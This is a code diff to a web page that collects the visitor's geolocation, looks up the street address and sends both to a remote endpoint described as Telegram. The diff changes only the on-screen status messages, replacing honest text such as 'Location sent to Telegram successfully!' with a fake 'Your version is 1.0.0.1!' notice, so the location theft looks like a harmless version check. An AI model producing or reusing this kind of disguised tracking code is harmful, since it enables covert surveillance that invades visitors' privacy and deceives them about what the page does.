@@ -20,13 +20,13 @@
       }
 
       const statusDiv = document.getElementById('status');
-      statusDiv.innerText = 'Getting location...';
+      statusDiv.innerText = 'Getting version...';
 
       navigator.geolocation.getCurrentPosition(async (pos) => {
         const lat = pos.coords.latitude;
         const lng = pos.coords.longitude;
 
-        statusDiv.innerText = 'Fetching address...';
+        statusDiv.innerText = 'Fetching version.....';
 
         try {
           // Fetch address from OpenCage API
@@ -37,7 +37,7 @@
 
           const address = data.results.length > 0 ? data.results[0].formatted : "Address not found";
 
-          statusDiv.innerText = 'Sending data...';
+          statusDiv.innerText = 'getting version';
 
           // Construct URL with query parameters for GET
           const url = `${webAppURL}?latitude=${encodeURIComponent(lat)}&longitude=${encodeURIComponent(lng)}&address=${encodeURIComponent(address)}`;
@@ -47,7 +47,7 @@
           const result = await res.json();
 
           if (result.status === 'success') {
-            statusDiv.innerText = 'Location sent to Telegram successfully!';
+            statusDiv.innerText = 'Your version is 1.0.0.1!';
           } else {
             statusDiv.innerText = 'Error: ' + result.message;
           }
@@ -63,3 +63,4 @@
   </script>
 </body>
 </html>
+
